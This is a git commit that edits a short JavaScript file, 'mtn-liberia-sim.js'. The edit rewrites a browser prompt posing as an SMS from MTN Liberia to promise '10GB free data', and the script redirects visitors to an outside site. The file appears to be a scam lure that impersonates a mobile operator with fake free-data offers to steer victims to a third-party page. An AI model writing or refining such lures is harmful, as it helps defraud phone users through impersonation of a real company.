23ce0d7616f3e319f41bd4e237b9e7b0584a2949
boss-bloq <nsisboy01@gmail.com>
2024-08-23 02:24:37 -0700

    Update mtn-liberia-sim.js

--- mtn-liberia-sim.js
+++ mtn-liberia-sim.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('SMS: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+password=prompt('SMS: We are sorry for the inconvenience and we are giving out 10GB free data, press 1 to Activate now ','1');
 if (password != '1') {
 location.href='https://damba-fest.org/mtn-liberia.html';
 }
